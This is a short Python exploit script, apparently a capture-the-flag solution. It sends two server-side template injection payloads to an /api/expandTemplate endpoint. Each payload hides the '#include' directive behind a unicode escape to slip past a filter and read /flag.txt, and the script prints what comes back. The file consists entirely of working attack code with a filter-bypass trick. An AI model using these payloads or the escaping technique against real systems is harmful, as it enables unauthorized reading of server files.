#!/usr/bin/env python3
import requests
import sys

if len(sys.argv) < 2:
    print(f"{sys.argv[0]} <HOST>")
    exit()

HOST = sys.argv[1]

url = f"http://{HOST}/api/expandTemplate"

send = lambda data: requests.post(url, json=data)

print(send({"template": "#set($x=\"#includ\\u0065('/flag.txt')\")\n$x"}).text)
print(send({"template": "#evaluate(\"\n#includ\\u0065('/flag.txt')\n\")"}).text)
